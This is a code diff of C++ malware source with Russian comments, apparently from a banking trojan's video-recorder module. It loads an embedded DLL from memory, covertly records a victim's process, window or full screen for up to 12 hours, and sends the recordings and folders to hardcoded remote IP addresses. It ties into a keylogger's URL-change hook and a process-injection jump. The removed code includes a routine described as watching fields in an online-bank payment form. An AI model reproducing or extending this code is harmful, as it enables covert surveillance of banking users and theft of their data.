@@ -43,11 +43,10 @@ namespace VIDEORECDEBUGSTRINGS
 //	char VIDEO_REC_HOST1[] = "178.162.179.65";
 //	char VIDEO_REC_HOST2[] = "188.72.202.163";
 
-//	char VIDEO_REC_HOST1[] = "127.0.0.1";
-//	char VIDEO_REC_HOST2[] = "127.0.0.1";
-
-	char VIDEO_REC_HOST1[] = "192.168.147.2";
-	char VIDEO_REC_HOST2[] = "193.106.161.242";
+	char VIDEO_REC_HOST1[] = "127.0.0.1";
+	char VIDEO_REC_HOST2[] = "127.0.0.1";
+//	char VIDEO_REC_HOST1[] = "192.168.147.2";
+//	char VIDEO_REC_HOST2[] = "193.106.161.242";
 #else
 	//Адрес сервера куда пишем видео
 	char VIDEO_REC_HOST1[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST1;
@@ -62,15 +61,6 @@ namespace VideoRecorder
 {
 	// Подключаем код библиотеки
 	#include "VideoRecorderDll.cpp"
-
-
-    char MethodStartRecordPid[] = {'S','t','a','r','t','R','e','c','P','i','d', 0};
-    char MethodStop[]           = {'S','t','o','p','R','e','c', 0};
-
-
-	// Функция загружает библиотеку
-	HMEMORYMODULE inline LoadDLL();
-
 }
 
 
@@ -110,11 +100,7 @@ void TVideoRecDLL::InitializeApi()
 	LoadFunc((LPVOID*)&Stop,            "StopRec");
 	LoadFunc((LPVOID*)&ResetTimer,      "ResetTimer");
 	LoadFunc((LPVOID*)&SendData,        "StartSend");
-	LoadFunc((LPVOID*)&StartFindFields, "StartFindFields");
-	LoadFunc((LPVOID*)&StopFindFields,  "StopFindFields");
 }
-
-
 
 
 
@@ -143,6 +129,7 @@ void TVideoRecorder::RecordProcess(DWORD PID)
 	// Функция запускает запись видео с указанного процесса
 	if (FDLL.RecordProcess)
 	{
+		if (!PID) PID = Bot->PID();
 		FDLL.RecordProcess(UID.t_str(), VideoName.t_str(), PID,
 						   Server.t_str(), Port,
 						   Server2.t_str(), Port2, RecordTime, 0);
@@ -153,7 +140,7 @@ void TVideoRecorder::RecordProcess(DWORD PID)
 void TVideoRecorder::RecordCurrentProcess()
 {
 	// функция запускает запись видео с текущего процесса
-	RecordProcess(Bot->PID());
+	RecordProcess(0);
 }
 //--------------------------------------------------------------
 
@@ -173,115 +160,153 @@ void TVideoRecorder::RecordWnd(HWND Wnd)
 					   Server2.t_str(), Port2, RecordTime, Flags);
     }
 }
+//--------------------------------------------------------------
 
-
-
-
-//*****************************************************************************
-
-HMEMORYMODULE inline VideoRecorder::LoadDLL()
+void TVideoRecorder::RecordScreen()
 {
-	// Функция загружает библиотеку
-	HMEMORYMODULE Module = MemoryLoadLibrary(VideoRecorder::data);
-
-	#ifdef DebugUtils
-		if (Module == NULL)
-			VDRDBG("VIDEO","Ошибка загрузки модуля");
-	#endif
-
-	return Module;
+	RecordWnd(NULL);
 }
-//*****************************************************************************
+//--------------------------------------------------------------
 
-
-
-
-//"89.149.226.121";
-
-
-HMEMORYMODULE	hLibWndRec = NULL;
-
-//StartRecHwnd( char* uid, char* nameVideo, HWND wnd, const char* ip, int port ) //запись по HWND окна
-//StartRecPid( char* uid, DWOD pid, char* ip, int port )  //запись по PID процесса
-typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags ) ;
-typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags );
-typedef VOID (WINAPI *TStopRec		)();
-typedef VOID (WINAPI *TResetTimer	)();
-
-typedef VOID (WINAPI *PStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );
-typedef VOID (WINAPI *PStartFindFields)();
-typedef VOID (WINAPI *PStopFindFields)();
-
-char CurrentChar[256];
-
-
-void StartRecordThread(DWORD pid,PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int port)//стартуем поток записи видео
+void TVideoRecorder::ResetTimer()
 {
-	VDRDBG("VIDEO","StartRecordThread");
+	// Функция обнуляет время записи
+	if (FDLL.ResetTimer) FDLL.ResetTimer();
+}
+//--------------------------------------------------------------
 
-	if (!hLibWndRec)
-		hLibWndRec = VideoRecorder::LoadDLL();
-
-	if (hLibWndRec)
+void TVideoRecorder::SendFiles(const char *Path)
+{
+	// Функция отправляет на сервер файлы из указанного пути
+	if (FDLL.SendData && !STRA::IsEmpty(Path))
 	{
+		FDLL.SendData(UID.t_str(), (char*)Path, Server.t_str(), Port,
+										        Server2.t_str(), Port2);
+    }
 
-		TStartRecPid pStartRecPid;
-	
-		pStartRecPid =(TStartRecPid)MemoryGetProcAddress(hLibWndRec,"StartRecPid");
-		if (pStartRecPid)
-		{
-			char Buf[100];
-			GenerateUid(Buf);
-			if (ip == NULL)
-				ip = GetVideoRecHost1();
-			if (ReservedIP == NULL)
-				ReservedIP = GetVideoRecHost2();
-			//Здесь надо получить второй айпи и порт(резервный)
-			VDRDBG("VIDEO","Все получили, теперь стартуем видео");
-			pStartRecPid(Buf, KeyWord, pid, ip, port, ReservedIP, port, 0, 0);
-		};
-	};
 }
+//--------------------------------------------------------------
 
-void VideoRecorderSendPath(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port)//стартуем поток отправки
+void TVideoRecorder::Stop()
 {
-	VDRDBG("VIDEO","слать даные из %s",Path);
-	HMEMORYMODULE	hLibWndRec1 = VideoRecorder::LoadDLL();;
-
-	if (hLibWndRec1)
-	{
-
-		PStartSend StartSend;
-
-		StartSend = (PStartSend)MemoryGetProcAddress(hLibWndRec1,"StartSend");
-		if (StartSend)
-		{
-			char Buf[100];
-			GenerateUid(Buf);
-
-			if (ip == NULL)
-				ip = GetVideoRecHost1();
-			if (ReservedIP == NULL)
-				ReservedIP = GetVideoRecHost2();
-			if (!port)
-				port = VIDEORECORD_DEFAULT_PORT;
-
-			//Здесь надо получить второй айпи и порт(резервный)
-			VDRDBG("VIDEO","Все готово запускаем(жмем и отрправляем данные) %s",ip);
-			StartSend(Buf,Path,ip,port, ReservedIP,port);
-			VDRDBG("VIDEO","Все отправили %s",ip);
-		};
-		MemoryFreeLibrary(hLibWndRec1);
-	};
+	// Функция останавливает запись
+	if (FDLL.Stop) FDLL.Stop();
 }
-//---------------------------------------------------------------------------------
+//--------------------------------------------------------------
+
+
+
+//*****************************************
+//  Глобальные данные модуля видеорекордера
+//*****************************************
+TVideoRecorder* VideoRecorderObj = NULL;
+DWORD           VideoRecorderPID = 0;
+
+
+
+//*****************************************
+//  Функция возвращает указатель на
+//  глобальный класс видеорекордера
+//*****************************************
+TVideoRecorder* GetVideoRecorder(bool CreateIfNotExists = true)
+{
+	if (IsNewProcess(VideoRecorderPID))
+		VideoRecorderObj = NULL;
+
+	if (!VideoRecorderObj && CreateIfNotExists)
+		VideoRecorderObj = new TVideoRecorder();
+
+	return VideoRecorderObj;
+}
+//----------------------------------------------------------------
+
+
+//------------------------------------------------------------
+// RecordProcess - Функция запускает асинхронную видеозапись
+// указанного процесса.
+//
+// PID - Идентификатор указанного процесса. Если 0, то будет
+//       вестись запись текущего процесса
+//
+// VideoName - имя видеозаписи
+//------------------------------------------------------------
+void VideoRecorder::RecordProcess(DWORD PID, const char* VideoName)
+{
+	TVideoRecorder* Recorder = GetVideoRecorder();
+	if (Recorder)
+	{
+		Recorder->VideoName = VideoName;
+        Recorder->RecordProcess(PID);
+    }
+}
+//-------------------------------------------------------------------------
+
+
+
+//------------------------------------------------------------
+// RecordWnd - Функция запускает ассинхронную запись видео с
+// указанного окна
+//
+// Wnd - Идентификатор окна
+// VideoName - Имя записи
+//------------------------------------------------------------
+void VideoRecorder::RecordWnd(HWND Wnd, const char* VideoName)
+{
+	TVideoRecorder* Recorder = GetVideoRecorder();
+	if (Recorder)
+	{
+		Recorder->VideoName = VideoName;
+        Recorder->RecordWnd(Wnd);
+    }
+}
+//------------------------------------------------------------
+
+
+
+//------------------------------------------------------------
+//  VideoRecorderSendFiles - Функция отправляет файлы из
+//  указанной папки на сервер видеозаписи.
+//  Настройки берутся глобальные.
+//------------------------------------------------------------
+void VideoRecorder::SendFiles(PCHAR Path)
+{
+	if (!STRA::IsEmpty(Path))
+	{
+		TVideoRecorder Recorder;
+		Recorder.SendFiles(Path);
+    }
+}
+
+
+void VideoRecorder::SendFiles(string const &Path)
+{
+	SendFiles(Path.t_str());
+}
+
+//-------------------------------------------------------------------------
+
+
+//------------------------------------------------------------
+//  Функция остонавливает запись
+//------------------------------------------------------------
+void VideoRecorder::Stop()
+{
+	TVideoRecorder* Recorder = GetVideoRecorder(false);
+	if (Recorder)
+		Recorder->Stop();
+}
+//-------------------------------------------------------------------------
+
+
 DWORD WINAPI StartSendinThread(LPVOID Data)
 {
 	//на случай если надо отправить в отдельном потоке
+
+	//??????????????????????????????????????????????????????
 	PCHAR Path_Folder;
 	if (Data!=NULL)
 	{
-		Path_Folder=(PCHAR)Data;
+		Path_Folder = (PCHAR)Data;
 	}
 	else
 	{
@@ -292,107 +317,14 @@ DWORD WINAPI StartSendinThread(LPVOID Data)
 	}
 
 	VDRDBG("VIDEO","полученное имя %s",Path_Folder);
-	VideoRecorderSendPath(Path_Folder,NULL,NULL, 700);
+	VideoRecorder::SendFiles(Path_Folder);
 	return 0;
 
 }
 //---------------------------------------------------------------------------------
 
-void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int port)//стартуем поток записи видео
-{
-	VDRDBG("VIDEO","Начинаем запись по хендлу окна");
-	if (!hLibWndRec)
-		hLibWndRec = VideoRecorder::LoadDLL();
-
-	if (!hLibWndRec)
-	{
-		VDRDBG("VIDEO","не получилось загрузить длл");
-		return;
-	}
-	if (hLibWndRec)
-	{
-
-		TStartRecHwnd pStartRecHwnd;
-
-		pStartRecHwnd = (TStartRecHwnd)MemoryGetProcAddress(hLibWndRec,"StartRecHwnd");
-		if (pStartRecHwnd)
-		{
-			char Buf[100];
-			GenerateUid(Buf);
-
-			if (ip == NULL)
-				ip = GetVideoRecHost1();
-			if (ReservedIP == NULL)
-				ReservedIP = GetVideoRecHost2();
-
-			//Здесь надо получить второй айпи и порт(резервный)
-			VDRDBG("VIDEO","Все готово запускаем");
-			pStartRecHwnd(Buf,KeyWord,hWnd,ip,port, ReservedIP, port, 0, 0);
-		};
-	};
-}
 
 
-void StopRecordThread()//останавливаем поток записи видео
-{
-
-	if (hLibWndRec)
-	{
-        VDRDBG("VIDEO","StopRecordThread");
-		TStopRec pStopRec;
-		pStopRec = (TStopRec) MemoryGetProcAddress(hLibWndRec,"StopRec");
-		if (pStopRec)
-		{
-			char Buf[100];
-			GenerateUid(Buf);
-			pStopRec();			
-		};
-
-	//MemoryFreeLibrary(hLibWndRec);
-	//hLibWndRec = NULL;
-	};
-}
-
-//поиск полей в форме платежки ИБанка
-void StartFindFields()
-{
-	if (!hLibWndRec)
-		hLibWndRec = VideoRecorder::LoadDLL();
-
-	if (!hLibWndRec)
-	{
-		VDRDBG("VIDEO","не получилось загрузить длл");
-		return;
-	}
-
-	VDRDBG("VIDEO","запускаем слежение  ");
-	if (hLibWndRec)
-	{
-		PStartFindFields pStartFindFields;
-		pStartFindFields = (PStartFindFields) MemoryGetProcAddress(hLibWndRec,"StartFindFields");
-		if (pStartFindFields)
-		{
-			
-			pStartFindFields();			
-		};
-	};
-}
-
-void StopFindFields()
-{
-
-	if (hLibWndRec)
-	{
-        VDRDBG("VIDEO","Стопаем поток слежения StopFindFields");
-		PStopFindFields pStopFindFields;
-		pStopFindFields = (PStartFindFields) MemoryGetProcAddress(hLibWndRec,"StopFindFields");
-		if (pStopFindFields)
-		{
-
-			pStopFindFields();
-		};
-	};
-}
 
 void WINAPI IEURLChanged(PKeyLogger, DWORD EventID, LPVOID Data)
 {
@@ -505,6 +437,32 @@ namespace VideoRecorderSrv
     }
 	//----------------------------------------------------------------------
 
+
+	DWORD WINAPI RecordThread(LPVOID Data)
+	{
+		// Поток записи видео
+
+		// Инициализируем  библиотеку
+		TVideoRecorder Recorder;
+
+		VDRDBG("VideoRecorder", "Запущен поток записи видео с процесса %d URL %s", ClientPID, ClientURL);
+		Recorder.RecordProcess(ClientPID);
+
+		// ожидаем окончания записи
+		while (!ClientTerminated)
+		{
+			pSleep(1000);
+			if (!IsProcessLeave(ClientPID))
+            	break;
+		}
+
+		Recorder.Stop();
+
+		VDRDBG("VideoRecorder", "Поток записи видео остановлен");
+		return 0;
+	}
+
+/*
 	DWORD WINAPI RecordThread(LPVOID Data)
 	{
 		// Поток записи видео
@@ -556,6 +514,7 @@ namespace VideoRecorderSrv
 
 		return 0;
 	}
+   */
 	//----------------------------------------------------------------------
 
 	void WINAPI ClientStopHandler(LPVOID, PPipeMessage Pipe, bool &Cancel)
@@ -661,6 +620,14 @@ namespace VideoRecorderSrv
 	}
 	//----------------------------------------------------------
 
+	string GetInfiniteRecordFile()
+	{
+		// Функция возвращает имя сигнального файла бесконечной записи
+		string Name = Bot->WorkPath() + "infvrc.dat";
+		return Name;
+	}
+	//----------------------------------------------------------
+
 
 
 	DWORD WINAPI InfiniteRecordingProc(LPVOID)
@@ -670,29 +637,68 @@ namespace VideoRecorderSrv
 
         VDRDBG("VideoRecorder", "Запускаем полноэкранную бесконечную запись видео");
 
-
-		PIPE::CreateProcessPipe(InfiniteRecorderPipe, true);
+        // Создаём пайп для контроля записи
+		PProcessPipe Pipe = PIPE::CreateProcessPipe(InfiniteRecorderPipe, true);
 
 		TVideoRecorder Recorder;
 
-		Recorder.VideoName = ClientURL;
-
-		Recorder.RecordWnd(0);
+		DWORD MaxRecordTime = 12*60*60*1000;
+		DWORD SleepInterval = 5*60*1000;
+//		DWORD MaxRecordTime = 60*1000;    // Для тестов
+//		DWORD SleepInterval = 10*1000;
 
 		// Входим в весный цикл ожидания
-		while (1) pSleep(INFINITE);
+		string FileName = GetInfiniteRecordFile();
 
+		while (1)
+		{
+			// Читаем имя записи из файла
+			TBotFileStream File(FileName.t_str(), fcmRead);
+
+			if (!File.Valid())
+			{
+				// Не удалось открыть файл, видимо занят
+				pSleep(1000);
+				continue;
+			}
+
+			// Проверяем максимальный интервал записи
+			DWORD  WriteTime = File::LastWriteTime(File.Handle());
+			if (WriteTime > MaxRecordTime)
+			{
+				// Превышено время записи. Прерываем процесс
+				Recorder.Stop();
+				break;
+            }
+
+			//  Проверяем изменения настроек
+			string Name = File.ReadToString();
+
+			if (Name.IsEmpty())
+				Name = "FullScr";
+
+			if (Recorder.VideoName != Name)
+			{
+				// Сменилось имя записи, либо запись ещё не запущена
+				Recorder.VideoName = Name;
+
+                // Стартуем запись
+				Recorder.RecordWnd(0);
+            }
+
+
+			pSleep(SleepInterval);
+		}
+
+		// Запись завершена, удаляем сигнальный файл
+		while (!pDeleteFileA(FileName.t_str()))
+			pSleep(100);
+
+		  // Разобраться с корректным закрытием пайпа
+//        PIPE::FreeProcessPipe(Pipe);
 		return 0;
-    }
-    //----------------------------------------------------------
-
-	string GetInfiniteRecordFile()
-	{
-		// Функция возвращает имя сигнального файла бесконечной записи
-		string Name = Bot->WorkPath() + "infvrc.dat";
-		return Name;
 	}
-	//----------------------------------------------------------
+    //----------------------------------------------------------
 
 	bool IsInfiniteRecording()
 	{
@@ -702,28 +708,43 @@ namespace VideoRecorderSrv
 	}
 	//----------------------------------------------------------
 
-	void StartInfiniteRecord(PCHAR Name)
+	void StartInfiniteRecord(PCHAR Name, bool UpdateFile)
 	{
 		// Функция запускает бесконечную запись видео всего экрана
 
 		// Создаём сигнальный файл
 		string FileName = GetInfiniteRecordFile();
-		if (!FileExistsA(FileName.t_str()))
-			File::WriteBufferA(FileName.t_str(), Name, STRA::Length(Name));
+
+		// При необходимости, создаём файл
+		if (!FileExistsA(FileName.t_str()) || UpdateFile)
+		{
+			DWORD Len = STRA::Length(Name);
+			// При записи учитываем, что файл может быть занят
+			if (Len)
+			while (1)
+			{
+				DWORD Writen = File::WriteBufferA(FileName.t_str(), Name, Len);
+				if (Writen == Len)
+					break;
+				else
+					pSleep(10);
+			}
+        }
 
 		// запускаем запись
 		if (!PIPE::Ping(InfiniteRecorderPipe))
 		{
-            SetClientParams(0, Name);
+			SetClientParams(0, Name);
+//			StartThread(InfiniteRecordingProc, NULL); // Для тестов
 			MegaJump(InfiniteRecordingProc);
-        }
+		}
 	}
 	//----------------------------------------------------------
 
 	void WINAPI ServerStartInfiniteHandler(LPVOID, PPipeMessage Msg, bool&)
 	{
 		//  обработчик команды бесконечной записи видео
-		StartInfiniteRecord(Msg->Data);
+		StartInfiniteRecord(Msg->Data, true);
 	}
 }
 //-----------------------------------------------------------------------------
@@ -743,7 +764,7 @@ bool VideoRecorderSrv::Start()
 		TBotFileStream File(FileName.t_str(), fcmRead);
 		string Name = File.ReadToString();
 
-		StartInfiniteRecord(Name.t_str());
+		StartInfiniteRecord(Name.t_str(), false);
 	}
 
 	// Добавляем обработчики команд
